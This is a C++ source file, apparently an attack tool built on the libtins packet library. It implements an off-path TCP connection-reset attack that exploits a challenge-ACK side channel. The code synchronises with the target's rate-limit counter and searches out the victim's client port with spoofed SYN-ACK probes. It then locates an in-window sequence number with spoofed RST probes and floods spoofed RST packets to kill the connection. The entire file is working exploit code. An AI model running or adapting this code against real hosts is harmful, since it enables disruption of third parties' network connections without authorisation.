#include "attacker.h"

#include <vector>
#include <thread>
#include <iostream>

#include "common.h"
#include "packet_counter.h"

using namespace std;
using namespace Tins;

const uint32_t kMaxPacketsPerSecond = 5000;

Attacker::Attacker(
        ConnectionID legitConn,
        uint32_t legitLastSeq,
        const string& victimIP) : 
    legitConn_(legitConn), legitLastSeq_(legitLastSeq), victimIP_(victimIP) {}

void Attacker::setEstimatedWindowSz(uint32_t sz) {
    estimatedWindowSz_ = sz;
}

chrono::milliseconds Attacker::synchronizeClock() {
    Tins::PacketSender sender;
    
    auto pkt = make_packet(legitConn_, "RA", legitLastSeq_ + 3);    
    auto pcounter = PacketCounter::instance();

    uint32_t n1, n2;
    {
        cout << "Sending out 200 packets in 1 sec..." << endl;
        pcounter->startCounting();
        auto s = align_and_delay(0ms);
        for (int i = 0; i < 200; i++) {
            sender.send(pkt);
            s += 5ms;
            this_thread::sleep_until(system_clock::time_point(s));
        }
        this_thread::sleep_for(2s);
        n1 = pcounter->stopCounting();
        cout << "n1 = " << n1 << endl;
    }

    {
        cout << "Sending out 200 packets in 1 sec and 5ms delay..." << endl;
        pcounter->startCounting();
        auto s = align_and_delay(5ms);
        for (int i = 0; i < 200; i++) {
            sender.send(pkt);
            s += 5ms;
            this_thread::sleep_until(system_clock::time_point(s));
        }
        this_thread::sleep_for(2s);
        n2 = pcounter->stopCounting();
        cout << "n2 = " << n2 << endl;
    }

    uint32_t delay_ms = 0;
    if (n1 == 100) {
        delay_ms = 0;
    } else if (n2 == 100) {
        delay_ms = 5;
    } else if (n1 > n2) {
        delay_ms = 5 + (n2 - 100) * 1000 / 200;
    } else {
        delay_ms = 5 + (300 - n2) * 1000 / 200;
    }
    syncDelayMs_ = milliseconds(delay_ms);
    return syncDelayMs_;
}

uint32_t Attacker::findPort(uint32_t from, uint32_t to) {
    auto start = from;
    cout << "Linear search" << endl;
    while (start <= to) {
        auto finish = min(start + kMaxPacketsPerSecond - 1, to);
        cout << "Probing ports " << start << "..." << finish << ": " << flush;
        if (hasPort(start, finish)) {
            cout << "Yes" << endl;
            from = start;
            to = finish;
            break;
        }
        cout << "No" << endl;
        start = finish + 1;
    }

    cout << "Binary search" << endl;
    auto left = from;
    auto right = to;
    while (left < right) {
        auto mid = (left + right + 1) / 2;
        cout << "Probing ports " << mid << "..." << right << ": " << flush;
        if (hasPort(mid, right)) {
            cout << "Yes" << endl;
            left = mid;
        } else {
            cout << "No" << endl;
            right = mid - 1;
        }
    }
    victimPort_ = left;
    return left;
}

bool Attacker::hasPort(uint32_t from, uint32_t to) {
    vector<IP> packets;
    ConnectionID victimConn(victimIP_, 0, legitConn_.serverIP, legitConn_.serverPort);
    for (auto port = from; port <= to; port++) {
        victimConn.clientPort = port;
        packets.push_back(make_packet(victimConn, "SA", 0));
    }
    for (int i = 0; i < 100; i++) {
        packets.push_back(make_packet(legitConn_, "RA", legitLastSeq_ + 3));
    }

    auto numReceived = sendPackets(packets);
    if (numReceived == 99) {
        return true;
    } else if (numReceived == 100) {
        return false;
    }
    throw "Port finding failed";
}

void Attacker::resetConnection() {
    uint32_t start, compensation, startOfFoundChunk, numBlocksOfFoundChunk;
    uint64_t maxSeqNum = (1UL << 32) - 1;
    bool found;
    do {
        found = false;
        start = 0;
        compensation = 0;
        while (start <= maxSeqNum) {
            uint32_t numBlocks = min(
                1UL*kMaxPacketsPerSecond, 
                (maxSeqNum - start + 1)/estimatedWindowSz_);
            cout << "Probing " << numBlocks << " blocks starting at " 
                << start << "..." << flush;
            auto numReceived = isInWindow(start, numBlocks);
            if (numReceived == 100) {
                cout << "No (" << numReceived << ")" << endl;
            } else {
                cout << "Yes (" << numReceived << ")" << endl;
            }
            if (numReceived < 100) {
                startOfFoundChunk = start;
                numBlocksOfFoundChunk = numBlocks;
                compensation += 100 - numReceived;
                found = true;
            } else if (numReceived == 100 && found == true) {
                break;
            }
            start += numBlocks * estimatedWindowSz_;
        }
        estimatedWindowSz_ *= compensation;
    } while (compensation > 1);

    // cout << "Binary search" << endl;
    auto left = 1U;
    auto right = numBlocksOfFoundChunk;
    while (left < right) {
        auto mid = (left + right + 1) / 2;
        auto midSeqNum = startOfFoundChunk + (mid - 1) * estimatedWindowSz_;
        auto numBlocks = right - mid + 1;
        cout << "Probing " << numBlocks 
             << " blocks starting at " << midSeqNum << "..." << flush;
        if (isInWindow(midSeqNum, numBlocks) == 99) {
            cout << "Yes" << endl;
            left = mid;
        } else {
            cout << "No" << endl;
            right = mid - 1;
        }
    }
    auto inWindowSeqNum = startOfFoundChunk + (left - 1) * estimatedWindowSz_;
    for (uint32_t i = 0U; i < (estimatedWindowSz_ / kMaxPacketsPerSecond + 1); i++) {
        auto from = inWindowSeqNum - kMaxPacketsPerSecond * (i + 1) + 1;
        from = max(from, 0U);
        auto to = from + kMaxPacketsPerSecond - 1;
        cout << "Sending RESET packets to seq " << from << "..." << to << endl;
        sendResetPacktes(from, to);
    }
}

uint32_t Attacker::isInWindow(uint32_t from, uint32_t numBlocks) {
    vector<IP> packets;
    ConnectionID victimConn(
        victimIP_, victimPort_, legitConn_.serverIP, legitConn_.serverPort);    
    for (uint32_t block = 0; block < numBlocks; block++) {
        auto packet = make_packet(
            victimConn, "R", from + estimatedWindowSz_ * block);
        packets.push_back(packet);
    }
    for (int i = 0; i < 100; i++) {
        packets.push_back(make_packet(legitConn_, "RA", legitLastSeq_ + 3));
    }
    return sendPackets(packets);
}

void Attacker::sendResetPacktes(uint32_t fromSeq, uint32_t toSeq) {
      vector<IP> packets;
    ConnectionID victimConn(
        victimIP_, victimPort_, legitConn_.serverIP, legitConn_.serverPort);    
    for (uint32_t seq =fromSeq; seq <= toSeq; seq++) {
        auto packet = make_packet(
            victimConn, "R", seq);
        packets.push_back(packet);
    }
    sendPackets(packets, 0);
}


uint32_t Attacker::sendPackets(const std::vector<Tins::IP>& packets, int threshold) {
    auto pcounter = PacketCounter::instance();
    int retry = 3;
    while (retry > 0) {
        pcounter->startCounting();
        align_and_delay(syncDelayMs_);
        for (auto p : packets) {
            sender_.send(p);
            this_thread::sleep_for(10us);
        }
        this_thread::sleep_for(2s);
        auto numReceived = pcounter->stopCounting();
        if (numReceived >= threshold) {
            return numReceived;
        }
        cout << endl << "Received " << numReceived << " packets. Retrying..." << endl;
        retry--;
    }
    throw "Too much packet loss or clock is not synchronized";
}
